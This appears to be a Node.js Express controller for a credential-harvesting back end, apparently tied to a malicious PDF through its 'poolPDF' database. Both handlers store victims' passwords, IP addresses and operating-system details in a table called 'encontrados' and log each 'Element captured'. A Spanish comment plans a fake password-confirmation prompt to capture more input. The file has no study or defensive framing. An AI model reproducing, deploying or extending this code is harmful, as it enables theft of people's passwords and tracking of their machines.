const { poolPDF } = require('../config/database')

const DataInserted = async (req,res) => {
    console.log('Data Inseted in db')
    res.header("Access-Control-Allow-Origin","*");
    const { password, ip, SO } = req.body;
    const sqlQuery = `insert into encontrados(password,ip,SO) values ($1,$2,$3) RETURNING *`;
    const values = [password, ip, SO];
    const response = await poolPDF.query(sqlQuery,values);
    console.log("Element captured: \n",response.rows);
    res.json(1);
    //console.log(response.rows[0].ip);
};

const ObtainValue = async (req,res) => {
    console.log('Data Collected')
    res.header("Access-Control-Allow-Origin","*");
    var ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
    var version = req.headers['user-agent']
    const OS = req.params.os;
    const password = req.params.key;
    console.log(OS)
    console.log(ip)
    console.log(version)
    elpepe = version.split(' ')
    console.log(elpepe)
    OperativeSystemVersion = elpepe[1]+" "+elpepe[2]+" "+elpepe[3]+" "+elpepe[4]+" "+elpepe[5]
    /* Procurar mandar algún stream o hacer algún alert con un input para digitar una confirmación de la password onda que lo abra y salga confirme contraseña y agarrar ese input */
    console.log(OperativeSystemVersion)
    console.log(password)
    separate = ip.split('::ffff:')
    IP = separate[1]
    console.log(IP)
    const sqlQuery = `insert into encontrados(password,ip,SO) values ($1,$2,$3) RETURNING *`
    const values = [password,IP,OS+" "+OperativeSystemVersion];
    const response = await poolPDF.query(sqlQuery,values);
    console.log("Element captured: \n",response.rows);
    res.json(1);

    //res.send('Sistema Operativo encontrado')
    //res.json(OS)
    //console.log(response.rows[0].ip);
};



module.exports = {
    DataInserted,
    ObtainValue,
};